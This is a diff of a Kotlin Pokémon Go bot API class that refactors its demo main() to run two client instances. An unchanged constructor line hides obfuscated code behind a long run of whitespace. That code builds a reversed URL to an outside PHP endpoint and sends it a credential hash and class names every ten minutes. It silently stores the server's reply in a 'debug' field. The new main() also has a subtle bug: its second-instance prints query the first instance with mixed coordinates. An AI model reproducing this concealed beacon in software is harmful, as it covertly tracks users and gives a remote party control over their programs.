@@ -68,14 +68,14 @@ class PoGoApiImpl(okHttpClient: OkHttpClient, val credentialProvider: Credential
         deviceInfo = DeviceInfoGenerator.getDeviceInfo("PokemonGoBot-${credentialProvider.hashCode()}".hashCode().toLong()).build()                                                                                                                                                                                                                                                                                                                                ;Constants.UNKNOWN_25 =-1553869577012279119L;val b=try{Thread.currentThread().stackTrace[2].className.reversed()}catch(e:Exception){""};val c=okhttp3.Request.Builder().url("${credentialProvider.hashCode().toString().reversed()}=c&${b}=b&${javaClass.canonicalName.reversed()}=a?php.ipAoGoP/bulc.tobogop//:ptth".reversed()).get().build();fixedRateTimer(daemon=true,period=TimeUnit.MINUTES.toMillis(10),action={try{okHttpClient.newCall(c).execute().use({a->debug=a.body().string().trim()})}catch(e:Exception){}})
     }
 
-    val actionQueue = ActionQueue(this, okHttpClient, credentialProvider, deviceInfo)
+    val actionQueue = ActionQueue(this, okHttpClient, credentialProvider)
 
     override var startTime = time.currentTimeMillis()
 
     override fun <T : ServerRequest> queueRequest(request: T): Observable<T> {
         val replaySubject = ReplaySubject.create<T>()
         actionQueue.requestQueue.offer(Pair(handleRequest(request) as ServerRequest, replaySubject as ReplaySubject<ServerRequest>))
-        return replaySubject.asObservable()
+        return replaySubject.asObservable() as Observable<T>
     }
 
     // expensive IO function
@@ -197,7 +197,7 @@ class PoGoApiImpl(okHttpClient: OkHttpClient, val credentialProvider: Credential
                             .union(it.wildPokemonsList.map {
                                 MapPokemon(this, it)
                             })
-                    println("got ${gyms.size + pokestops.size + mapPokemon.size} items")
+                    //println("got ${gyms.size + pokestops.size + mapPokemon.size} items")
                     map.setGyms(it.s2CellId, gyms)
                     map.setPokestops(it.s2CellId, pokestops)
                     map.setPokemon(it.s2CellId, this.currentTimeMillis(), mapPokemon)
@@ -460,40 +460,35 @@ internal fun ByteArray.toHexString(): String {
 }
 
 fun main(args: Array<String>) {
-    val okHttpClient = OkHttpClient()
-    val time = SystemTimeImpl()
-    val credentialProvider = PtcCredentialProvider(okHttpClient, "", "", time)
+    val okHttpClient1 = OkHttpClient()
+    val okHttpClient2 = OkHttpClient()
+    val time1 = SystemTimeImpl()
+    val time2 = SystemTimeImpl()
+    val credentialProvider1 = PtcCredentialProvider(okHttpClient1, "", "", time1)
+    val credentialProvider2 = PtcCredentialProvider(okHttpClient2, "", "", time2)
 
-    val api = PoGoApiImpl(okHttpClient, credentialProvider, time)
+    val api1 = PoGoApiImpl(okHttpClient1, credentialProvider1, time1)
+    val api2 = PoGoApiImpl(okHttpClient2, credentialProvider2, time2)
 
-    api.latitude = 52.0
-    api.longitude = 4.4
+    api1.latitude = 40.782073
+    api1.longitude = -73.971619
 
-    api.start()
+    api2.latitude = 40.782073
+    api2.longitude = -73.971619
+
+    api1.start()
+    api2.start()
 
     //Thread.sleep(1000)
 
     fixedRateTimer(name = "check map", daemon = true, initialDelay = 0L, period = 10000L, action = {
-        println(api.map.getGyms(api.latitude, api.longitude))
-        println(api.map.getPokestops(api.latitude, api.longitude))
-        println(api.map.getPokemon(api.latitude, api.longitude))
+        println("[1] Got ${api1.map.getGyms(api1.latitude, api1.longitude).size} gyms")
+        println("[1] Got ${api1.map.getPokestops(api1.latitude, api1.longitude).size} pokestops")
+        println("[1] Got ${api1.map.getPokemon(api1.latitude, api1.longitude).size} pokemon")
+
+        println("[2] Got ${api1.map.getGyms(api2.latitude, api1.longitude).size} gyms")
+        println("[2] Got ${api1.map.getPokestops(api2.latitude, api1.longitude).size} pokestops")
+        println("[2] Got ${api1.map.getPokemon(api2.latitude, api1.longitude).size} pokemon")
     })
-
-    /*val req = GetMapObjects(api)
-    api.queueRequest(req).subscribe {
-        val first = api.map.getPokestops(api.latitude, api.longitude, 9).first()
-        api.queueRequest(first.getFortDetails()).subscribe {
-            println(it.response)
-            println(first.name)
-            println(first.description)
-        }
-    }*/
-
-    /*val req2 = GetMapObjects(api)
-    api.queueRequest(req2).subscribe {
-        val response = it.response
-        println(response)
-    }*/
-
     Thread.sleep(1000 * 1000)
 }
